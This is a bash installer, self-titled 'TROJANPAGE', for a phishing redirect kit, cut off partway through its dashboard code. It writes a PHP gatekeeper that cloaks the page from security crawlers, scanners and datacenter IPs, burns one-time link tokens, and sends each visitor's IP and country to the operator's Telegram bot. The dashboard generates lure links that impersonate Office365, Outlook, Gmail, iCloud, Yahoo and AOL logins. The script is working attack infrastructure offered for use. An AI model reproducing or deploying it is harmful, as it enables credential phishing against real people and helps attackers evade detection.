#!/bin/bash
# 🏛️ TROJANPAGE - VALIDATED GHOST EDITION (V14.8.2)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PREP ---
mkdir -p /root/db/
touch /root/db/used_tokens.txt
chmod 777 /root/db/used_tokens.txt

# --- 2. SETTINGS & VALIDATION ---
show_header

# --- TOKEN VALIDATION LOOP ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -e "${CYAN}[...] Validating Token...${NC}"
    CHECK_TOKEN=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
    if [[ $CHECK_TOKEN == *"\"ok\":true"* ]]; then
        BOT_NAME=$(echo $CHECK_TOKEN | grep -oP '(?<="first_name":")[^"]*')
        echo -e "${GREEN}[success] Connected to: $BOT_NAME${NC}"
        break
    else
        echo -e "${RED}[error] Invalid Telegram Token. Please try again.${NC}"
    fi
done

read -p "Enter Telegram Chat ID: " TG_ID
read -p "Enter Cloudflare API Token: " CF_TOKEN
read -p "Enter Base Domain: " USER_DOMAIN
USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
read -p "Enter Custom Path Slug (e.g., verify): " USER_SLUG
CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')

# --- 3. THE SMART GATEKEEPER (ALL DOMAINS + TG ALERTS) ---
mkdir -p /var/www/adobe_gui/s
cat << EOF > /var/www/adobe_gui/s/index.php
<?php
\$botToken = "$TG_TOKEN";
\$chatId = "$TG_ID";
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ua = strtolower(\$_SERVER['HTTP_USER_AGENT']);
\$token = \$_GET['t'];
\$target = \$_GET['id'];

// A. BOT SIGNATURE CHECK
\$bots = ['google','bot','crawler','spider','yandex','headless','lighthouse','python','curl','wget','zgrab','shodan'];
foreach (\$bots as \$bot) {
    if (strpos(\$ua, \$bot) !== false) {
        header("Location: https://www.google.com");
        exit();
    }
}

// B. DATA CENTER CHECK
\$meta = json_decode(file_get_contents("http://ip-api.com/json/{\$ip}?fields=hosting,proxy,country"));
if (\$meta && (\$meta->hosting == true || \$meta->proxy == true)) {
    header("Location: https://www.microsoft.com");
    exit();
}

// C. ONE-TIME TOKEN CHECK (THE BURNER)
\$used_tokens = file("/root/db/used_tokens.txt", FILE_IGNORE_NEW_LINES);
if (in_array(\$token, \$used_tokens)) {
    header("Location: https://www.microsoft.com"); 
    exit();
}
file_put_contents("/root/db/used_tokens.txt", \$token . PHP_EOL, FILE_APPEND);

// D. TELEGRAM NOTIFICATION
\$msg = "🔔 *Link Burned!* \n\n";
\$msg .= "📍 *IP:* " . \$ip . " (" . (\$meta->country ?? 'Unknown') . ")\n";
\$msg .= "🎯 *Target:* " . strtoupper(\$target) . "\n";
\$msg .= "🔑 *Token:* " . \$token;

\$tg_url = "https://api.telegram.org/bot" . \$botToken . "/sendMessage?chat_id=" . \$chatId . "&text=" . urlencode(\$msg) . "&parse_mode=Markdown";
@file_get_contents(\$tg_url);

// E. UNIVERSAL REDIRECT
\$mask = \$_GET['m'];
\$domain = \$_SERVER['HTTP_HOST'];
\$slug = \$_GET['s'];

if(\$target && \$mask && \$slug) {
    header("Location: https://" . \$mask . "." . \$target . "." . \$domain . "/" . \$slug);
} else {
    header("Location: https://www.google.com");
}
exit();
?>
EOF

# --- 4. THE COMPLETE DASHBOARD ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

CONFIG="/root/config.json"
DOMAIN=$(grep -oP '(?<="proxyDomain": ")[^"]*' $CONFIG)
SLUG=$(echo "$USER_SLUG") 
MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

# Tracker Logic
if [ -f /root/links_batch.txt ]; then
    TOTAL=$(wc -l < /root/links_batch.txt)
    BURNED=$(grep -Ff <(grep -oP 't=\K.*' /root/links_batch.txt) /root/db/used_tokens.txt | wc -l)
    LIVE=$((TOTAL - BURNED))
else
    TOTAL=0; BURNED=0; LIVE=0
fi

show_header
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}COMPLETE GHOST TERMINAL${NC} | ${PURPLE}ALERTS:${NC} ACTIVE | ${GREEN}STATUS: ONLINE${NC}     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | https://$DOMAIN/s/?id=office&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://$DOMAIN/s/?id=outlook&m=$MASK&s=$SLUG&t=$TOKEN ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}  ${YELLOW}BATCH TRACKER:${NC} TOTAL: $TOTAL
